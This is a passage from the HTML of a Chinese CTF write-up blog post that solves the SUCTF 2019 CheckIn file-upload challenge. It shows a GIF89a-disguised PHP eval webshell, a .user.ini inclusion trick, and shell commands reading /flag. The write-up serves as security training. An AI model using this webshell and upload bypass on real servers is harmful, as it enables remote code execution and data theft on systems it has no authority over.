+<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".user.ini"</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span>  <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h3 id="Payload2-上传GIF89a-png"><a href="#Payload2-上传GIF89a-png" class="headerlink" title="Payload2:上传GIF89a.png"></a>Payload2:上传GIF89a.png</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a
+<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>回显：</p>
+<blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">Your dir uploads<span class="token operator">/</span>c47b21fcf8f0bc8b3920541abd8024fd
+Your files <span class="token punctuation">:</span>
+<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">".."</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"GIF89a .png"</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"index.php"</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>此时<code>index.php</code>就派上了用场(辅助执行木马)</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<h3 id="Finally-Payload"><a href="#Finally-Payload" class="headerlink" title="Finally Payload:"></a>Finally Payload:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//643e64f0-56f2-4c6a-a8fc-600932030edc.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206272109751.png" alt="image-20220627210907712"></p>
+<p>根目录得到flag</p>
+<h2 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h2><pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;var_dump(scandir(&quot;&#x2F;&quot;)); shell&#x3D;var_dump(file_get_contents(&quot;&#x2F;flag&quot;)); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">?shell&#x3D;system(&#39;cat &#x2F;flag&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><ol>
+<li><blockquote>
+<p>一句话木马绕过&lt;?</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>绕过exif_imagetype()方法的检测</p>
+</blockquote>
+</li>
+<li><blockquote>
+<p>.user.ini文件会更新消失</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kanyun</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kannikanyun.github.io/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/">https://kannikanyun.github.io/2022/06/27/BUU刷题记4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kannikanyun.github.io" target="_blank">Kanyun's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-WEB/">CTF_WEB</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://s2.loli.net/2022/01/26/yx6wog4V9tDNiUz.jpg" target="_blank"><img class="post-qr-code-img" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131636877.jpg" alt="WeChat"/></a><div class="post-qr-code-desc">WeChat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/06/26/BUU%E5%88%B7%E9%A2%983/"><img class="next-cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUU刷题3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/05/12/BUU-Web-page1/" title=""><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730213.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-12</div><div class="title"></div></div></a></div><div><a href="/2022/06/26/BUU%E5%88%B7%E9%A2%983/" title="BUU刷题3"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-26</div><div class="title">BUU刷题3</div></div></a></div><div><a href="/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/" title="BUUweb刷题记录2"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-14</div><div class="title">BUUweb刷题记录2</div></div></a></div><div><a href="/2022/03/24/CtfhubDay1/" title="CtfhubDay1"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730213.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-24</div><div class="title">CtfhubDay1</div></div></a></div><div><a href="/2022/02/18/Xctf--Web--Challenge--area%20Wp/" title="Xctf--Web--Challenge--area Wp"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-18</div><div class="title">Xctf--Web--Challenge--area Wp</div></div></a></div><div><a href="/2022/04/14/ctf.show_web9/" title="ctf.show_web9"><img class="cover" src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730606.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-14</div><div class="title">ctf.show_web9</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206131634016.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">kanyun</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1EK411s7qM?from=search&amp;seid=11090646219321326337&amp;spm_id_from=333.337.0.0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://kannikanyun.github.io/" target="_blank" title="Github"><i class="我的Blog"></i></a><a class="social-icon" href="mailto:1391205637@qq.com" target="_blank" title="Email"><i class="我的邮箱"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="http://www.iceo.com.cn/"><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是一个随意的地方haha @</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="toc-number">1.</span> <span class="toc-text">[极客大挑战 2019]HardSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">题目环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">万能密码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">尝试报错注入：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">报错注入使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81extractvalue%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">一、extractvalue函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E9%80%89%E6%8B%A9%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">我们选择：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload1-%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">Payload1(查看版本):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload2-%E7%88%86%E5%BA%93"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">Payload2(爆库):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload3-%E7%88%86%E8%A1%A8"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">Payload3(爆表):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload4-%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">Payload4(爆字段名):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload5-%E7%88%86%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">Payload5(爆字段值):</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RIGHT-str-len"><span class="toc-number">1.3.</span> <span class="toc-text">RIGHT(str,len)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload6-%E6%9F%A5%E5%8F%B3%E5%8D%8A%E6%AE%B5flag"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">Payload6(查右半段flag):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E6%8B%BC%E6%8E%A5%E5%BE%97%EF%BC%9A"><span class="toc-number">1.3.0.2.</span> <span class="toc-text">flag拼接得：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">2.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">尝试一句话木马：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87-lt-%E7%9A%84%E5%9B%BE%E7%89%87%E9%A9%AC%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">尝试绕过&lt;?的图片马：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87-lt"><span class="toc-number">2.2.3.</span> <span class="toc-text">尝试绕过&lt;?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exif-imagetype"><span class="toc-number">2.2.4.</span> <span class="toc-text">exif_imagetype</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GIF89a%E5%9B%BE%E7%89%87%E5%A4%B4%E6%96%87%E4%BB%B6%E6%AC%BA%E9%AA%97%EF%BC%8C"><span class="toc-number">2.2.5.</span> <span class="toc-text">GIF89a图片头文件欺骗，</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.6.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#user-ini"><span class="toc-number">2.2.6.1.</span> <span class="toc-text">user.ini</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload2-%E4%B8%8A%E4%BC%A0GIF89a-png"><span class="toc-number">2.2.7.</span> <span class="toc-text">Payload2:上传GIF89a.png</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finally-Payload"><span class="toc-number">2.2.8.</span> <span class="toc-text">Finally Payload:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">法二：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-number">2.4.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-Ez-bypass"><span class="toc-number">3.</span> <span class="toc-text">[MRCTF2020]Ez_bypass</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/" title="BUU刷题记4"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU刷题记4"/></a><div class="content"><a class="title" href="/2022/06/27/BUU%E5%88%B7%E9%A2%98%E8%AE%B04/" title="BUU刷题记4">BUU刷题记4</a><time datetime="2022-06-27T09:47:28.000Z" title="发表于 2022-06-27 17:47:28">2022-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/26/BUU%E5%88%B7%E9%A2%983/" title="BUU刷题3"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730201.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU刷题3"/></a><div class="content"><a class="title" href="/2022/06/26/BUU%E5%88%B7%E9%A2%983/" title="BUU刷题3">BUU刷题3</a><time datetime="2022-06-26T01:19:05.000Z" title="发表于 2022-06-26 09:19:05">2022-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="文件上传&amp;条件竞争"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730606.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传&amp;条件竞争"/></a><div class="content"><a class="title" href="/2022/06/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="文件上传&amp;条件竞争">文件上传&amp;条件竞争</a><time datetime="2022-06-24T14:02:38.000Z" title="发表于 2022-06-24 22:02:38">2022-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/24/%E6%97%A0%E5%8F%82rce/" title="无参rce"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031730114.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无参rce"/></a><div class="content"><a class="title" href="/2022/06/24/%E6%97%A0%E5%8F%82rce/" title="无参rce">无参rce</a><time datetime="2022-06-24T10:49:11.000Z" title="发表于 2022-06-24 18:49:11">2022-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/17/public/workbox-e28eeb62/" title="无题"><img src= "/%E7%B4%AF%E4%BA%86%E6%AD%87%E4%B8%80%E4%BC%9A%20%E7%AD%89%E7%AD%89%E6%88%91" data-lazy-src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731505.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/06/17/public/workbox-e28eeb62/" title="无题">无题</a><time datetime="2022-06-17T05:33:42.844Z" title="发表于 2022-06-17 13:33:42">2022-06-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204031731042.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By kanyun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">不期而遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
